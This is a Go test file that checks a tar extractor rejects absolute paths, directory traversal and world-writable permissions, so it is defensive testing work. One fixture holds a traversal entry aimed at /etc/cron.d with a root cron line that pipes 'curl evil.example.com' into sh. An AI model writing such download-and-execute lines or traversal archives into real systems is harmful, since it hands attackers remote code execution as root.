//go:build linux || darwin

package osinstaller

import (
	"archive/tar"
	"bytes"
	"io"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// newTestConfig creates an InstallationConfiguration whose WorkingDir resolves
// to an isolated temporary directory that is automatically removed after the test.
// It returns both the config and the resolved working directory path so that
// callers use the same base as extractFiles does.
func newTestConfig(t *testing.T) (cfg *InstallationConfiguration, dir string) {
	t.Helper()
	dir = t.TempDir()
	cfg = &InstallationConfiguration{WorkingDirName: dir}
	// cfg.WorkingDir() prepends ~/.checkmarx/; return the resolved path so all
	// test assertions reference the exact location that extractFiles writes to.
	resolved := cfg.WorkingDir()
	require.NoError(t, os.MkdirAll(resolved, 0755))
	return cfg, resolved
}

// buildTar assembles an in-memory tar archive from a slice of entries.
func buildTar(t *testing.T, entries []tarEntry) *tar.Reader {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range entries {
		hdr := &tar.Header{
			Typeflag: e.typeflag,
			Name:     e.name,
			Size:     int64(len(e.content)),
			Mode:     e.mode,
		}
		require.NoError(t, tw.WriteHeader(hdr))
		if e.content != "" {
			_, err := tw.Write([]byte(e.content))
			require.NoError(t, err)
		}
	}
	require.NoError(t, tw.Close())
	return tar.NewReader(bytes.NewReader(buf.Bytes()))
}

type tarEntry struct {
	typeflag byte
	name     string
	content  string
	mode     int64
}

// --- safeJoin unit tests ---

func TestSafeJoin_ValidRelativePath(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	got, err := safeJoin(base, "subdir/file.bin")
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(base, "subdir", "file.bin"), got)
}

func TestSafeJoin_AbsolutePathRejected(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, err := safeJoin(base, "/etc/passwd")
	assert.ErrorContains(t, err, "absolute")
}

func TestSafeJoin_TraversalRejected(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, err := safeJoin(base, "../../../../etc/cron.d/evil")
	assert.ErrorContains(t, err, "traversal")
}

func TestSafeJoin_TraversalWithDotDot(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, err := safeJoin(base, "../sibling")
	assert.ErrorContains(t, err, "traversal")
}

func TestSafeJoin_EmptyNameRejected(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, err := safeJoin(base, "")
	assert.ErrorContains(t, err, "empty or dot")
}

func TestSafeJoin_DotNameRejected(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, err := safeJoin(base, ".")
	assert.ErrorContains(t, err, "empty or dot")
}

// --- extractFiles integration tests ---

func TestExtractFiles_ValidRegularFile(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "tool", "hello world", 0644},
	})

	require.NoError(t, extractFiles(cfg, tr))

	content, err := os.ReadFile(filepath.Join(dir, "tool"))
	require.NoError(t, err)
	assert.Equal(t, "hello world", string(content))
}

func TestExtractFiles_NonExecutablePermissions(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "data.json", `{"key":"val"}`, 0644},
	})

	require.NoError(t, extractFiles(cfg, tr))

	info, err := os.Stat(filepath.Join(dir, "data.json"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0644), info.Mode().Perm())
}

func TestExtractFiles_ExecutablePermissions(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "scanner", "ELF", 0755},
	})

	require.NoError(t, extractFiles(cfg, tr))

	info, err := os.Stat(filepath.Join(dir, "scanner"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0755), info.Mode().Perm())
}

func TestExtractFiles_NoWorldWritePermission(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	// Even if the tar header carries 0777, the extractor must not set world-write.
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "binary", "data", 0777},
	})

	require.NoError(t, extractFiles(cfg, tr))

	info, err := os.Stat(filepath.Join(dir, "binary"))
	require.NoError(t, err)
	assert.Zero(t, info.Mode().Perm()&0002, "world-write bit must not be set")
}

func TestExtractFiles_DirectoryEntry(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeDir, "subdir/", "", 0755},
		{tar.TypeReg, "subdir/file.txt", "content", 0644},
	})

	require.NoError(t, extractFiles(cfg, tr))

	info, err := os.Stat(filepath.Join(dir, "subdir"))
	require.NoError(t, err)
	assert.True(t, info.IsDir())
}

func TestExtractFiles_NestedFileWithoutExplicitDirEntry(t *testing.T) {
	// The extractor must create parent directories even when the archive
	// omits an explicit TypeDir entry for them.
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "a/b/c/file.txt", "nested", 0644},
	})

	require.NoError(t, extractFiles(cfg, tr))

	content, err := os.ReadFile(filepath.Join(dir, "a", "b", "c", "file.txt"))
	require.NoError(t, err)
	assert.Equal(t, "nested", string(content))
}

func TestExtractFiles_AbsolutePathInArchiveRejected(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "/tmp/evil", "pwned", 0644},
	})

	err := extractFiles(cfg, tr)
	assert.ErrorContains(t, err, "absolute")
}

func TestExtractFiles_PathTraversalRejected(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "../../../../etc/cron.d/backdoor", "* * * * * root curl evil.example.com|sh", 0644},
	})

	err := extractFiles(cfg, tr)
	assert.ErrorContains(t, err, "traversal")
}

func TestExtractFiles_PathTraversalDirRejected(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeDir, "../outside/", "", 0755},
	})

	err := extractFiles(cfg, tr)
	assert.ErrorContains(t, err, "traversal")
}

func TestExtractFiles_AbsoluteDirRejected(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeDir, "/tmp/injected/", "", 0755},
	})

	err := extractFiles(cfg, tr)
	assert.ErrorContains(t, err, "absolute")
}

func TestExtractFiles_TraversalFileNotCreatedOnDisk(t *testing.T) {
	// Confirm that the actual resolved traversal target was NOT created on disk.
	t.Parallel()
	cfg, dir := newTestConfig(t)

	// The traversal "../canary.txt" from dir would land one level up — compute that exact path.
	target := filepath.Join(filepath.Dir(dir), "canary.txt")
	_ = os.Remove(target)

	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "../canary.txt", "injected", 0644},
	})
	_ = extractFiles(cfg, tr)

	_, err := os.Stat(target)
	assert.True(t, os.IsNotExist(err), "traversal target must not have been created on disk")
}

func TestExtractFiles_BrokenArchiveReturnsError(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	// Feed a truncated/garbage stream — must return an error, not call log.Fatalf.
	tr := tar.NewReader(bytes.NewReader([]byte("not a valid tar stream")))

	err := extractFiles(cfg, tr)
	assert.Error(t, err)
}

func TestExtractFiles_EmptyArchiveSucceeds(t *testing.T) {
	t.Parallel()
	cfg, _ := newTestConfig(t)
	tr := buildTar(t, nil)

	assert.NoError(t, extractFiles(cfg, tr))
}

func TestExtractFiles_MultipleFiles(t *testing.T) {
	t.Parallel()
	cfg, dir := newTestConfig(t)
	tr := buildTar(t, []tarEntry{
		{tar.TypeReg, "file1.txt", "one", 0644},
		{tar.TypeReg, "file2.txt", "two", 0644},
		{tar.TypeReg, "file3.txt", "three", 0644},
	})

	require.NoError(t, extractFiles(cfg, tr))

	for _, name := range []string{"file1.txt", "file2.txt", "file3.txt"} {
		_, err := os.Stat(filepath.Join(dir, name))
		assert.NoError(t, err, "expected %s to exist", name)
	}
}

func TestExtractFiles_UnknownEntryTypeSkipped(t *testing.T) {
	// TypeSymlink is not handled; the extractor must skip it without failing,
	// and must still extract the following valid entry.
	t.Parallel()
	cfg, dir := newTestConfig(t)

	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Typeflag: tar.TypeSymlink,
		Name:     "link",
		Linkname: "target",
	}))
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Typeflag: tar.TypeReg,
		Name:     "real.txt",
		Size:     int64(len("data")),
		Mode:     0644,
	}))
	_, err := io.WriteString(tw, "data")
	require.NoError(t, err)
	require.NoError(t, tw.Close())

	assert.NoError(t, extractFiles(cfg, tar.NewReader(bytes.NewReader(buf.Bytes()))))

	// Verify the valid entry after the symlink was still extracted correctly.
	content, err := os.ReadFile(filepath.Join(dir, "real.txt"))
	require.NoError(t, err)
	assert.Equal(t, "data", string(content))
}
